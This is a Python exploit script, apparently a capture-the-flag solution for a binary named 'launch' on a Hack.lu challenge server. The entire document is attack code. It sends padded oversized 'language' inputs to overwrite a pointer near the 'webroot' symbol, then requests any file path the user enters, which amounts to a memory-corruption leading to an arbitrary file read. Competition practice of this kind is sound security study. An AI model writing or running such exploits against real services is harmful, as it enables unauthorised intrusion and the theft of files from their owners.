#!/usr/bin/env python
from sc_pwn import *

env = Environment('local', 'remote')
env.set_item('target',  local   = {'host':'192.168.75.139','port':8080}, \
                        remote  = {'host':'cthulhu.fluxfingers.net','port':1509})
#env.select('local')
env.select()

binf = ELF('launch')
addr_webroot = binf.symbol('webroot')

#==========
def attack(cmn):
    #cmn.set_show('RAW')
    
    cmn.sendln('get')
    cmn.read_until('please send a path\n')
    cmn.sendln('hogefuga')
    cmn.read_until('unable to open file\n')

    exploit_st1  = 'language'
    exploit_st1 += '\x00'*(0x4000-len(exploit_st1)-1)
    exploit_st1 += pack_64(addr_webroot-9-1)
    cmn.sendln(exploit_st1)
    cmn.sendln('japanese,plz!!!!')
    
    exploit_st2  = 'language'
    exploit_st2 += '\x00'*(0x4000-len(exploit_st2)-1)
    exploit_st2 += '\x00' # idx
    cmn.sendln(exploit_st2)

    payload  = '\x01'
    payload += pack_64(0)
    payload += pack_64(addr_webroot+8)
    payload += '\x00'
    
    cmn.sendln(payload)
    
    cmn.sendln('get')
    cmn.read_until('please send a path\n')
    
    file = raw_input('path >> ')
    cmn.sendln(file)

    print cmn.read_all()

#==========

if __name__=='__main__':
    cmn = Communicate(env.target,mode='SOCKET')
    attack(cmn)
    
    del(cmn)
    
#==========
